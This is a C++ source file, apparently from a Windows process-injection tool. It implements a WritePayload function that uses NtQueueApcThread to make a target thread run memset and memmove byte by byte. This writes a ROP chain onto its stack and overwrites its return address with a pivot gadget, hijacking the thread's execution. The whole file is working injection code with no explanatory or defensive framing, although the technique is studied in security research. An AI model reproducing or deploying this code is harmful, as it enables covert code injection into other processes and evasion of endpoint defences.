#include "set_remote_memory.h"
#include "rop_chain.h"

using _NtQueueApcThread = NTSTATUS(NTAPI*)(
	_In_ HANDLE ThreadHandle,
	_In_ PVOID ApcRoutine,
	_In_ PVOID ApcRoutineContext OPTIONAL,
	_In_ PVOID ApcStatusBlock OPTIONAL,
	_In_ __int64 ApcReserved OPTIONAL
	);

int WritePayload(TARGET_THREAD* target, TStrDWORD64Map* params) {
	HMODULE h_ntdll = GetModuleHandleA("ntdll");
	if (!h_ntdll)
		return 1;

	HANDLE h_thread = target->hThread;
	PINJECT_PACKET* payload;

	payload = BuildPayload(*params);
	if (payload == NULL)
		return NULL;

	TStrDWORD64Map& t_metadata = *payload->metadata;

	DWORD64 orig_tos = t_metadata["orig_tos"];
	DWORD64 tos = t_metadata["tos"];
	DWORD64 rop_pos = t_metadata["rop_pos"];
	DWORD64* rop_chain = (DWORD64*)payload->buffer;
	DWORD64 saved_return_address = t_metadata["saved_return_address"];
	DWORD64 gadget_pivot = t_metadata["gadget_pivot"];

	_NtQueueApcThread NtQueueApcThread = (_NtQueueApcThread)GetProcAddress(h_ntdll, "NtQueueApcThread");

	// Write the new stack
	for (int i = 0; i < rop_pos * sizeof(DWORD64); i++)
		NtQueueApcThread(h_thread, GetProcAddress(h_ntdll, "memset"), (void*)(tos + i), (void*)*(((BYTE*)rop_chain) + i), 1);

	// Save the original return address into the new stack
	NtQueueApcThread(h_thread, GetProcAddress(h_ntdll, "memmove"), (void*)(rop_chain[saved_return_address]), (void*)orig_tos, 8);

	// overwrite the original return address with gadget_pivot
	for (int i = 0; i < sizeof(tos); i++)
		NtQueueApcThread(h_thread, GetProcAddress(h_ntdll, "memset"), (void*)(orig_tos + i), (void*)(((BYTE*)&gadget_pivot)[i]), 1);

	// overwrite the original tos+8 with the new tos address (we don't need to restore this since it's shadow stack!
	for (int i = 0; i < sizeof(tos); i++)
		NtQueueApcThread(h_thread, GetProcAddress(h_ntdll, "memset"), (void*)(orig_tos + 8 + i), (void*)(((BYTE*)&tos)[i]), 1);

}